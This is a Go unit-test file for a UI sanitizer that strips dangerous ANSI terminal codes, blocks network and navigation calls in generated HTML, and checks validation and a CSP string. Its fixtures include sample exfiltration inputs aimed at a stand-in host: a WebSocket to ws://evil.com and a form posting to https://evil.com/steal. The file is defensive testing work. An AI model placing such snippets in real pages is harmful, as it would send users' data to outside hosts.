package genui

import (
	"strings"
	"testing"
)

// ---------------------------------------------------------------------------
// ANSI sanitizer tests
// ---------------------------------------------------------------------------

func TestSanitizeANSI_AllowsColors(t *testing.T) {
	input := "\033[31mred text\033[0m"
	got := SanitizeANSI(input)
	if got != input {
		t.Errorf("color sequence was stripped: got %q, want %q", got, input)
	}
}

func TestSanitizeANSI_AllowsBold(t *testing.T) {
	input := "\033[1mbold\033[0m"
	got := SanitizeANSI(input)
	if got != input {
		t.Errorf("bold sequence was stripped: got %q, want %q", got, input)
	}
}

func TestSanitizeANSI_AllowsBoxDrawing(t *testing.T) {
	input := "┌──────┐\n│ test │\n└──────┘"
	got := SanitizeANSI(input)
	if got != input {
		t.Errorf("box drawing chars were modified: got %q, want %q", got, input)
	}
}

func TestSanitizeANSI_BlocksCursorMove(t *testing.T) {
	input := "hello\033[Hworld"
	got := SanitizeANSI(input)
	if strings.Contains(got, "\033[H") {
		t.Errorf("cursor home was not blocked: got %q", got)
	}
	if !strings.Contains(got, "hello") || !strings.Contains(got, "world") {
		t.Errorf("text content was lost: got %q", got)
	}
}

func TestSanitizeANSI_BlocksScreenClear(t *testing.T) {
	input := "\033[2Jcleared"
	got := SanitizeANSI(input)
	if strings.Contains(got, "\033[2J") {
		t.Errorf("screen clear was not blocked: got %q", got)
	}
	if !strings.Contains(got, "cleared") {
		t.Errorf("text content was lost: got %q", got)
	}
}

func TestSanitizeANSI_BlocksScrollRegion(t *testing.T) {
	input := "\033[rscroll"
	got := SanitizeANSI(input)
	if strings.Contains(got, "\033[r") {
		t.Errorf("scroll region was not blocked: got %q", got)
	}
	if !strings.Contains(got, "scroll") {
		t.Errorf("text content was lost: got %q", got)
	}
}

func TestSanitizeANSI_BlocksCursorUp(t *testing.T) {
	input := "line\033[Aup"
	got := SanitizeANSI(input)
	if strings.Contains(got, "\033[A") {
		t.Errorf("cursor up was not blocked: got %q", got)
	}
}

func TestSanitizeANSI_BlocksCursorDown(t *testing.T) {
	input := "line\033[Bdown"
	got := SanitizeANSI(input)
	if strings.Contains(got, "\033[B") {
		t.Errorf("cursor down was not blocked: got %q", got)
	}
}

func TestSanitizeANSI_PreservesText(t *testing.T) {
	input := "plain text without any escape codes"
	got := SanitizeANSI(input)
	if got != input {
		t.Errorf("plain text was modified: got %q, want %q", got, input)
	}
}

func TestSanitizeANSI_MixedContent(t *testing.T) {
	// Mix safe SGR (color) with dangerous cursor-move sequences.
	input := "\033[32mgreen\033[0m then \033[Hmove \033[1mbold\033[0m"
	got := SanitizeANSI(input)

	// Safe sequences must remain.
	if !strings.Contains(got, "\033[32m") {
		t.Errorf("safe color was stripped: got %q", got)
	}
	if !strings.Contains(got, "\033[1m") {
		t.Errorf("safe bold was stripped: got %q", got)
	}
	// Dangerous sequence must be removed.
	if strings.Contains(got, "\033[H") {
		t.Errorf("dangerous cursor home was not blocked: got %q", got)
	}
	// Text must survive.
	if !strings.Contains(got, "green") || !strings.Contains(got, "bold") {
		t.Errorf("text content was lost: got %q", got)
	}
}

// ---------------------------------------------------------------------------
// HTML sanitizer tests
// ---------------------------------------------------------------------------

func TestSanitizeHTML_RemovesFetch(t *testing.T) {
	input := `<script>fetch("/api/data")</script>`
	got := SanitizeHTML(input)
	if !strings.Contains(got, "/* BLOCKED: fetch( */") {
		t.Errorf("expected BLOCKED comment for fetch: got %q", got)
	}
	// The original call-site "fetch(" must be replaced; only the comment should remain.
	stripped := strings.ReplaceAll(got, "/* BLOCKED: fetch( */", "")
	if strings.Contains(stripped, "fetch(") {
		t.Errorf("fetch( still present outside BLOCKED comment: got %q", got)
	}
}

func TestSanitizeHTML_RemovesXHR(t *testing.T) {
	input := `<script>var x = new XMLHttpRequest();</script>`
	got := SanitizeHTML(input)
	if strings.Contains(got, "XMLHttpRequest") && !strings.Contains(got, "BLOCKED") {
		t.Errorf("XMLHttpRequest was not blocked: got %q", got)
	}
	if !strings.Contains(got, "/* BLOCKED: XMLHttpRequest */") {
		t.Errorf("expected BLOCKED comment for XMLHttpRequest: got %q", got)
	}
}

func TestSanitizeHTML_RemovesWebSocket(t *testing.T) {
	input := `<script>var ws = new WebSocket("ws://evil.com");</script>`
	got := SanitizeHTML(input)
	if strings.Contains(got, "new WebSocket") && !strings.Contains(got, "BLOCKED") {
		t.Errorf("new WebSocket was not blocked: got %q", got)
	}
	if !strings.Contains(got, "/* BLOCKED: new WebSocket */") {
		t.Errorf("expected BLOCKED comment for new WebSocket: got %q", got)
	}
}

func TestSanitizeHTML_AllowsInlineCSS(t *testing.T) {
	input := `<style>body { background: #000; color: #fff; }</style>`
	got := SanitizeHTML(input)
	if got != input {
		t.Errorf("inline CSS was modified: got %q, want %q", got, input)
	}
}

func TestSanitizeHTML_AllowsInlineJS(t *testing.T) {
	// Script without network patterns should pass through.
	input := `<script>document.getElementById("x").textContent = "hello";</script>`
	got := SanitizeHTML(input)
	if got != input {
		t.Errorf("safe inline JS was modified: got %q, want %q", got, input)
	}
}

func TestSanitizeHTML_AllowsSVG(t *testing.T) {
	input := `<svg width="100" height="100"><circle cx="50" cy="50" r="40"/></svg>`
	got := SanitizeHTML(input)
	if got != input {
		t.Errorf("SVG was modified: got %q, want %q", got, input)
	}
}

func TestSanitizeHTML_AllowsCanvas(t *testing.T) {
	input := `<canvas id="c" width="200" height="200"></canvas>`
	got := SanitizeHTML(input)
	if got != input {
		t.Errorf("canvas was modified: got %q, want %q", got, input)
	}
}

func TestSanitizeHTML_AllowsPostMessage(t *testing.T) {
	input := `<script>parent.postMessage({action:"done"}, "*");</script>`
	got := SanitizeHTML(input)
	if got != input {
		t.Errorf("postMessage was modified: got %q, want %q", got, input)
	}
}

func TestSanitizeHTML_BlocksFormAction(t *testing.T) {
	input := `<form action="https://evil.com/steal" method="POST"><input name="data"/></form>`
	got := SanitizeHTML(input)
	if strings.Contains(got, "https://evil.com") {
		t.Errorf("external form action was not blocked: got %q", got)
	}
	if !strings.Contains(got, `action="about:blank"`) {
		t.Errorf("expected form action replaced with about:blank: got %q", got)
	}
}

func TestSanitizeHTML_BlocksWindowOpen(t *testing.T) {
	input := `<script>window.open("https://evil.com")</script>`
	got := SanitizeHTML(input)
	if strings.Contains(got, "window.open") && !strings.Contains(got, "BLOCKED") {
		t.Errorf("window.open was not blocked: got %q", got)
	}
	if !strings.Contains(got, "/* BLOCKED: window.open */") {
		t.Errorf("expected BLOCKED comment for window.open: got %q", got)
	}
}

func TestSanitizeHTML_BlocksWindowLocation(t *testing.T) {
	input := `<script>window.location = "https://evil.com"</script>`
	got := SanitizeHTML(input)
	if strings.Contains(got, "window.location") && !strings.Contains(got, "BLOCKED") {
		t.Errorf("window.location was not blocked: got %q", got)
	}
	if !strings.Contains(got, "/* BLOCKED: window.location */") {
		t.Errorf("expected BLOCKED comment for window.location: got %q", got)
	}
}

// ---------------------------------------------------------------------------
// Validation tests
// ---------------------------------------------------------------------------

func TestValidate_EmptyCode(t *testing.T) {
	err := Validate("", FormatANSI)
	if err == nil {
		t.Fatal("expected error for empty code, got nil")
	}
	if !strings.Contains(err.Error(), "empty") {
		t.Errorf("expected 'empty' in error message, got: %s", err)
	}
}

func TestValidate_ValidANSI(t *testing.T) {
	code := "\033[31mred\033[0m normal \033[1mbold\033[0m"
	err := Validate(code, FormatANSI)
	if err != nil {
		t.Errorf("expected nil for valid ANSI, got: %s", err)
	}
}

func TestValidate_ANSI_NoReset(t *testing.T) {
	code := "\033[31mred text without reset"
	err := Validate(code, FormatANSI)
	if err == nil {
		t.Fatal("expected error for ANSI without reset, got nil")
	}
	if !strings.Contains(err.Error(), "no reset") {
		t.Errorf("expected 'no reset' in error message, got: %s", err)
	}
}

func TestValidate_ValidHTML(t *testing.T) {
	code := "<div><h1>Hello</h1></div>"
	err := Validate(code, FormatHTML)
	if err != nil {
		t.Errorf("expected nil for valid HTML, got: %s", err)
	}
}

func TestValidate_HTML_NoTags(t *testing.T) {
	code := "just plain text, no angle brackets"
	err := Validate(code, FormatHTML)
	if err == nil {
		t.Fatal("expected error for HTML without tags, got nil")
	}
	if !strings.Contains(err.Error(), "no tags") {
		t.Errorf("expected 'no tags' in error message, got: %s", err)
	}
}

func TestValidate_HTML_UnclosedDiv(t *testing.T) {
	code := "<div><p>content</p>"
	err := Validate(code, FormatHTML)
	if err == nil {
		t.Fatal("expected error for unclosed div, got nil")
	}
	if !strings.Contains(err.Error(), "</div>") {
		t.Errorf("expected '</div>' in error message, got: %s", err)
	}
}

func TestValidate_Markdown_AlwaysValid(t *testing.T) {
	code := "# Heading\n\nSome markdown **bold** text."
	err := Validate(code, FormatMarkdown)
	if err != nil {
		t.Errorf("expected nil for markdown, got: %s", err)
	}
}

// ---------------------------------------------------------------------------
// CSP test
// ---------------------------------------------------------------------------

func TestGenerateCSP(t *testing.T) {
	csp := GenerateCSP()

	required := []string{
		"default-src 'none'",
		"style-src 'unsafe-inline'",
		"script-src 'unsafe-inline'",
		"img-src data:",
	}
	for _, r := range required {
		if !strings.Contains(csp, r) {
			t.Errorf("CSP missing %q: got %q", r, csp)
		}
	}
}
